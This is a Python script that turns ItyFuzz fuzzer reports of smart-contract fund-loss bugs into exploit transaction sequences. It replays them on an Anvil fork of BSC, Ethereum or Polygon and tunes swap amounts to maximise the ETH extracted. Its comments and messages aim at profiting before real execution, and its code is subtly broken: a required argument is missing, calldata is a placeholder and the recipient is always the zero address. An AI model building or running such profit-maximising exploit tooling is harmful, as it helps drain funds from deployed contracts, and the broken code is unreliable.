#!/usr/bin/env python3
"""
ItyFuzz Transaction Simulator using Anvil Fork

This simulator:
1. Forks the blockchain at the vulnerability block
2. Finds the maximum extractable amount through optimization
3. Simulates the exact transaction sequence
4. Verifies profitability before execution
"""

import subprocess
import json
import time
import re
from typing import List, Dict, Tuple, Optional
from web3 import Web3
from eth_account import Account
import requests

class AnvilSimulator:
    """Simulates ItyFuzz vulnerabilities using Anvil fork"""
    
    def __init__(self, chain: str = "bsc", block_number: int = None):
        self.chain = chain
        self.block_number = block_number
        self.anvil_process = None
        self.w3 = None
        self.fork_url = None
        
        # RPC endpoints for different chains
        self.rpc_endpoints = {
            "eth": "https://eth-mainnet.g.alchemy.com/v2/demo",
            "bsc": "https://bsc-dataseed.binance.org/",
            "polygon": "https://polygon-rpc.com",
            "arbitrum": "https://arb1.arbitrum.io/rpc"
        }
        
    def start_fork(self, fork_block: int = None):
        """Start Anvil fork at specific block"""
        fork_block = fork_block or self.block_number
        
        # Get RPC URL for chain
        rpc_url = self.rpc_endpoints.get(self.chain)
        if not rpc_url:
            raise ValueError(f"Unsupported chain: {self.chain}")
        
        # Start Anvil with fork
        cmd = [
            "anvil",
            "--fork-url", rpc_url,
            "--port", "8545",
            "--chain-id", str(self._get_chain_id()),
            "--accounts", "10",
            "--balance", "100000",  # Give test accounts lots of ETH
            "--block-time", "0",
            "--no-mining"
        ]
        
        if fork_block:
            cmd.extend(["--fork-block-number", str(fork_block)])
        
        print(f"Starting Anvil fork at block {fork_block}...")
        self.anvil_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait for Anvil to start
        time.sleep(3)
        
        # Connect to local Anvil instance
        self.w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))
        self.fork_url = "http://localhost:8545"
        
        print(f"Anvil started. Fork block: {self.w3.eth.block_number}")
        
    def stop_fork(self):
        """Stop Anvil fork"""
        if self.anvil_process:
            self.anvil_process.terminate()
            self.anvil_process.wait()
            print("Anvil stopped")
    
    def _get_chain_id(self) -> int:
        """Get chain ID for network"""
        chain_ids = {
            "eth": 1,
            "bsc": 56,
            "polygon": 137,
            "arbitrum": 42161
        }
        return chain_ids.get(self.chain, 1)
    
    def find_maximum_exploit(self, transactions: List[Dict], test_account: str) -> Dict:
        """Find the maximum amount that can be exploited"""
        print("\n=== Finding Maximum Extractable Value ===")
        
        # First, run the original exploit to get baseline
        baseline_result = self.simulate_exploit(transactions, test_account)
        baseline_profit = baseline_result.get('net_profit_eth', 0)
        
        print(f"Baseline profit: {baseline_profit} ETH")
        
        # Now optimize each transaction
        optimized_txs = transactions.copy()
        max_profit = baseline_profit
        best_txs = transactions.copy()
        
        # Try to optimize swap amounts
        for i, tx in enumerate(transactions):
            if 'swap' in tx.get('description', '').lower():
                print(f"\nOptimizing transaction {i+1}: {tx.get('description', '')}")
                
                # Try different amounts
                original_value = tx['value']
                
                # Test exponentially increasing amounts
                test_multipliers = [0.1, 0.5, 1, 2, 5, 10, 50, 100, 1000]
                
                for multiplier in test_multipliers:
                    test_value = int(original_value * multiplier)
                    
                    # Create test transaction set
                    test_txs = optimized_txs.copy()
                    test_txs[i] = tx.copy()
                    test_txs[i]['value'] = test_value
                    
                    # Reset blockchain state
                    snapshot_id = self.w3.provider.make_request("evm_snapshot", [])['result']
                    
                    # Test this configuration
                    try:
                        result = self.simulate_exploit(test_txs, test_account)
                        profit = result.get('net_profit_eth', 0)
                        
                        print(f"  Multiplier {multiplier}x: {profit} ETH profit")
                        
                        if profit > max_profit:
                            max_profit = profit
                            best_txs = test_txs.copy()
                            optimized_txs = test_txs.copy()
                            print(f"  ✅ New maximum found!")
                    except Exception as e:
                        print(f"  ❌ Failed with {multiplier}x: {str(e)}")
                    
                    # Revert to snapshot
                    self.w3.provider.make_request("evm_revert", [snapshot_id])
        
        # Binary search for even more precise optimization
        print("\n=== Fine-tuning with binary search ===")
        for i, tx in enumerate(best_txs):
            if 'swap' in tx.get('description', '').lower() and tx['value'] > 0:
                optimal_value = self._binary_search_optimal_amount(
                    best_txs, i, test_account, max_profit
                )
                if optimal_value:
                    best_txs[i]['value'] = optimal_value
        
        # Final simulation with optimized parameters
        print("\n=== Final Optimized Simulation ===")
        final_result = self.simulate_exploit(best_txs, test_account)
        
        return {
            'baseline_profit': baseline_profit,
            'optimized_profit': final_result.get('net_profit_eth', 0),
            'improvement': final_result.get('net_profit_eth', 0) - baseline_profit,
            'optimized_transactions': best_txs,
            'final_result': final_result
        }
    
    def _binary_search_optimal_amount(self, txs: List[Dict], tx_index: int, 
                                    test_account: str, current_best: float) -> Optional[int]:
        """Binary search for optimal transaction amount"""
        tx = txs[tx_index]
        original_value = tx['value']
        
        # Search range: 0.1x to 1000x original
        min_value = int(original_value * 0.1)
        max_value = int(original_value * 1000)
        
        best_value = original_value
        best_profit = current_best
        
        print(f"Binary search for transaction {tx_index + 1}...")
        
        while max_value - min_value > Web3.to_wei(1, 'ether'):
            mid_value = (min_value + max_value) // 2
            
            # Create test set
            test_txs = txs.copy()
            test_txs[tx_index] = tx.copy()
            test_txs[tx_index]['value'] = mid_value
            
            # Take snapshot
            snapshot_id = self.w3.provider.make_request("evm_snapshot", [])['result']
            
            try:
                result = self.simulate_exploit(test_txs, test_account)
                profit = result.get('net_profit_eth', 0)
                
                if profit > best_profit:
                    best_profit = profit
                    best_value = mid_value
                    min_value = mid_value  # Try higher
                else:
                    max_value = mid_value  # Try lower
            except:
                max_value = mid_value  # Failed, try lower
            
            # Revert
            self.w3.provider.make_request("evm_revert", [snapshot_id])
        
        if best_value != original_value:
            print(f"  Optimized from {Web3.from_wei(original_value, 'ether')} to {Web3.from_wei(best_value, 'ether')} ETH")
            return best_value
        
        return None
    
    def simulate_exploit(self, transactions: List[Dict], test_account: str = None) -> Dict:
        """Simulate exploit transactions"""
        if not self.w3:
            raise Exception("Fork not started. Call start_fork() first")
        
        # Get test account with balance
        if not test_account:
            test_account = self.w3.eth.accounts[0]
        
        initial_balance = self.w3.eth.get_balance(test_account)
        
        print(f"\nSimulating with account: {test_account}")
        print(f"Initial balance: {Web3.from_wei(initial_balance, 'ether')} ETH")
        
        results = []
        total_gas_used = 0
        
        for i, tx in enumerate(transactions):
            print(f"\nTransaction {i+1}:")
            print(f"  To: {tx['to']}")
            print(f"  Value: {Web3.from_wei(tx.get('value', 0), 'ether')} ETH")
            print(f"  Data: {tx.get('data', '0x')[:10]}...")
            if 'description' in tx:
                print(f"  Description: {tx['description']}")
            
            # Build transaction
            transaction = {
                'from': test_account,
                'to': tx['to'],
                'value': tx.get('value', 0),
                'data': tx.get('data', '0x'),
                'gas': 5000000,
                'gasPrice': self.w3.eth.gas_price
            }
            
            try:
                # Send transaction
                tx_hash = self.w3.eth.send_transaction(transaction)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
                
                print(f"  Status: {'Success' if receipt.status else 'Failed'}")
                print(f"  Gas used: {receipt.gasUsed}")
                
                total_gas_used += receipt.gasUsed
                
                results.append({
                    'success': receipt.status == 1,
                    'tx_hash': tx_hash.hex(),
                    'gas_used': receipt.gasUsed,
                    'logs': receipt.logs
                })
                
                if receipt.status == 0:
                    print("  Transaction failed! Stopping simulation.")
                    break
                    
            except Exception as e:
                print(f"  Error: {str(e)}")
                results.append({
                    'success': False,
                    'error': str(e)
                })
                break
        
        # Calculate final balance and profit
        final_balance = self.w3.eth.get_balance(test_account)
        profit_wei = final_balance - initial_balance
        profit_eth = Web3.from_wei(profit_wei, 'ether')
        
        # Account for gas costs
        gas_cost_wei = total_gas_used * self.w3.eth.gas_price
        gas_cost_eth = Web3.from_wei(gas_cost_wei, 'ether')
        net_profit_eth = profit_eth - gas_cost_eth
        
        print(f"\n=== Simulation Results ===")
        print(f"Final balance: {Web3.from_wei(final_balance, 'ether')} ETH")
        print(f"Gross profit: {profit_eth} ETH")
        print(f"Gas cost: {gas_cost_eth} ETH")
        print(f"Net profit: {net_profit_eth} ETH")
        
        return {
            'success': all(r['success'] for r in results),
            'transactions': results,
            'initial_balance': initial_balance,
            'final_balance': final_balance,
            'gross_profit_eth': float(profit_eth),
            'gas_cost_eth': float(gas_cost_eth),
            'net_profit_eth': float(net_profit_eth)
        }

class ItyFuzzTransactionBuilder:
    """Builds executable transactions from ItyFuzz output"""
    
    def __init__(self, chain: str = "bsc"):
        self.chain = chain
        
        # Known contract addresses
        self.routers = {
            "eth": {
                "UniswapV2": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
                "SushiSwap": "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"
            },
            "bsc": {
                "PancakeSwap": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                "Router": "0x10ED43C718714eb63d5aA57B78B54704E256024E"  # Default
            },
            "polygon": {
                "QuickSwap": "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"
            }
        }
        
        self.weth_addresses = {
            "eth": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "bsc": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",  # WBNB
            "polygon": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"  # WMATIC
        }
    
    def parse_ityfuzz_trace_for_maximum(self, trace_text: str, content: str) -> List[Dict]:
        """Parse ItyFuzz trace and find maximum profitable transaction sequence"""
        
        # First parse the reported vulnerability
        transactions = self.parse_ityfuzz_trace(trace_text)
        
        # Look for other transaction sequences in the full content
        # that might yield higher profits
        all_sequences = self._extract_all_transaction_sequences(content)
        
        # Find the most valuable sequence
        max_value = self._calculate_sequence_value(transactions)
        best_sequence = transactions
        
        for seq in all_sequences:
            value = self._calculate_sequence_value(seq)
            if value > max_value:
                max_value = value
                best_sequence = seq
        
        print(f"Found {len(all_sequences)} transaction sequences")
        print(f"Maximum sequence value: {max_value} ETH")
        
        return best_sequence
    
    def _extract_all_transaction_sequences(self, content: str) -> List[List[Dict]]:
        """Extract all transaction sequences from the log"""
        sequences = []
        
        # Find all Router.swapExactETHForTokens patterns
        swap_pattern = r'Router\.swapExactETHForTokens\{value: ([\d.]+) ether\}'
        
        # Find transaction blocks
        tx_blocks = re.split(r'\[Sender\]', content)
        
        for block in tx_blocks[1:]:  # Skip first empty block
            transactions = []
            
            for match in re.finditer(swap_pattern, block):
                value_ether = float(match.group(1))
                if value_ether > 0 or len(transactions) > 0:  # Include 0 ETH if part of sequence
                    tx = self._build_swap_transaction(
                        value_ether=value_ether,
                        amount_out_min="0",
                        path=[],
                        to="0x" + "0" * 40
                    )
                    transactions.append(tx)
            
            if transactions:
                sequences.append(transactions)
        
        return sequences
    
    def _calculate_sequence_value(self, sequence: List[Dict]) -> float:
        """Calculate total value in a transaction sequence"""
        total = 0
        for tx in sequence:
            total += Web3.from_wei(tx.get('value', 0), 'ether')
        return total
    
    def parse_ityfuzz_trace(self, trace_text: str) -> List[Dict]:
        """Parse ItyFuzz trace and build transactions"""
        transactions = []
        
        # Parse the winning transaction from the trace
        lines = trace_text.strip().split('\n')
        
        for line in lines:
            # Parse Router.swapExactETHForTokens calls
            swap_match = re.match(r'.*Router\.swapExactETHForTokens\{value: ([\d.]+) ether\}\((.*?)\)', line)
            if swap_match:
                value_ether = float(swap_match.group(1))
                params = swap_match.group(2)
                
                # Parse parameters
                param_parts = params.split(', ')
                amount_out_min = param_parts[0] if len(param_parts) > 0 else "0"
                
                # Extract path
                path_match = re.search(r'path:\((.*?)\)', params)
                if path_match:
                    path_str = path_match.group(1)
                    tokens = self._parse_path(path_str)
                else:
                    tokens = []
                
                # Extract recipient
                to_match = re.search(r'address\(this\)|0x[a-fA-F0-9]{40}', params)
                recipient = "0x" + "0" * 40  # Default to zero address
                
                # Build transaction
                tx = self._build_swap_transaction(
                    value_ether=value_ether,
                    amount_out_min=amount_out_min,
                    path=tokens,
                    to=recipient
                )
                transactions.append(tx)
            
            # Parse direct contract calls
            call_match = re.match(r'.*(0x[a-fA-F0-9]{40})\.call\{value: (\d+)\}\((.*?)\)', line)
            if call_match:
                to_address = call_match.group(1)
                value = int(call_match.group(2))
                data = call_match.group(3)
                
                # Parse data
                if data.startswith('abi.encodeWithSelector'):
                    selector_match = re.search(r'0x[a-fA-F0-9]+', data)
                    if selector_match:
                        data = selector_match.group(0)
                else:
                    data = data.strip() if data else "0x"
                
                transactions.append({
                    'to': to_address,
                    'value': value,
                    'data': data,
                    'description': f'Call to {to_address[:10]}...'
                })
        
        return transactions
    
    def _parse_path(self, path_str: str) -> List[str]:
        """Parse token path from string like 'WETH → 0x...'"""
        tokens = []
        
        # Split by arrow
        parts = path_str.split(' → ')
        
        for part in parts:
            part = part.strip()
            if part.upper() in ['WETH', 'WBNB', 'WMATIC']:
                # Convert to address
                tokens.append(self.weth_addresses.get(self.chain, part))
            elif part.startswith('0x'):
                tokens.append(part)
        
        return tokens
    
    def _build_swap_transaction(self, value_ether: float, amount_out_min: str, 
                                path: List[str], to: str) -> Dict:
        """Build swapExactETHForTokens transaction"""
        # Get router address
        router = self.routers.get(self.chain, {}).get("Router", self.routers["bsc"]["Router"])
        
        # Convert value to wei
        value_wei = Web3.to_wei(value_ether, 'ether')
        
        # Encode function call
        # swapExactETHForTokens(uint amountOutMin, address[] path, address to, uint deadline)
        # Function selector: 0x7ff36ab5
        
        # For maximum extraction, always use amount_out_min = 0
        # This prevents reverts due to slippage
        function_selector = "0x7ff36ab5"
        
        # Set deadline to far future
        deadline = int(time.time()) + 3600  # 1 hour from now
        
        # Simplified data - in production use proper ABI encoding
        data = function_selector + "0" * 56  # Placeholder encoding
        
        return {
            'to': router,
            'value': value_wei,
            'data': data,
            'description': f'Swap {value_ether} ETH for tokens'
        }

def simulate_vulnerability(log_file: str, chain: str = "bsc", block_number: int = None):
    """Main function to simulate vulnerability from log file"""
    
    print(f"=== ItyFuzz Maximum Value Extractor ===")
    print(f"Log file: {log_file}")
    print(f"Chain: {chain}")
    print(f"Block: {block_number}")
    
    # Read log file
    with open(log_file, 'r') as f:
        content = f.read()
    
    # Extract vulnerability info
    vuln_match = re.search(r"Found vulnerabilities!.*?\[Fund Loss\]: Anyone can earn ([\d.]+) ETH", content, re.DOTALL)
    if not vuln_match:
        print("No vulnerability found in log")
        return
    
    expected_profit = float(vuln_match.group(1))
    print(f"\nReported profit: {expected_profit} ETH")
    
    # Extract trace
    trace_start = content.find("================ Trace ================")
    if trace_start == -1:
        print("No trace found in log")
        return
    
    trace_end = content.find("\n\n", trace_start + 50)
    trace_section = content[trace_start:trace_end]
    
    # Parse transactions with maximum extraction in mind
    builder = ItyFuzzTransactionBuilder(chain)
    transactions = builder.parse_ityfuzz_trace_for_maximum(trace_section, content)
    
    print(f"\nParsed {len(transactions)} transactions for maximum extraction")
    
    # Start simulation
    simulator = AnvilSimulator(chain, block_number)
    
    try:
        simulator.start_fork()
        
        # Find maximum extractable value
        optimization_result = simulator.find_maximum_exploit(transactions)
        
        print(f"\n=== Maximum Extraction Results ===")
        print(f"Reported profit: {expected_profit} ETH")
        print(f"Baseline profit: {optimization_result['baseline_profit']} ETH")
        print(f"Optimized profit: {optimization_result['optimized_profit']} ETH")
        print(f"Improvement: {optimization_result['improvement']} ETH")
        
        if optimization_result['optimized_profit'] > expected_profit:
            print(f"\n🚀 Found {optimization_result['optimized_profit'] - expected_profit} ETH more than reported!")
        
        if optimization_result['optimized_profit'] > 0:
            print(f"\n✅ Maximum extractable value: {optimization_result['optimized_profit']} ETH")
            
            # Show optimized transaction details
            print("\nOptimized transaction sequence:")
            for i, tx in enumerate(optimization_result['optimized_transactions']):
                print(f"{i+1}. {tx.get('description', 'Transaction')} - {Web3.from_wei(tx['value'], 'ether')} ETH")
        else:
            print(f"\n❌ Not profitable after gas costs")
            
    finally:
        simulator.stop_fork()

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Simulate ItyFuzz vulnerabilities with maximum extraction')
    parser.add_argument('log_file', help='Path to ItyFuzz log file')
    parser.add_argument('--chain', default='bsc', help='Blockchain (eth, bsc, polygon)')
    parser.add_argument('--block', type=int, help='Fork block number')
    
    args = parser.parse_args()
    
    # Extract block number from log if not provided
    if not args.block:
        with open(args.log_file, 'r') as f:
            content = f.read()
            block_match = re.search(r'block.*?(\d{8,})', content, re.IGNORECASE)
            if block_match:
                args.block = int(block_match.group(1))
    
    simulate_vulnerability(args.log_file, args.chain, args.block)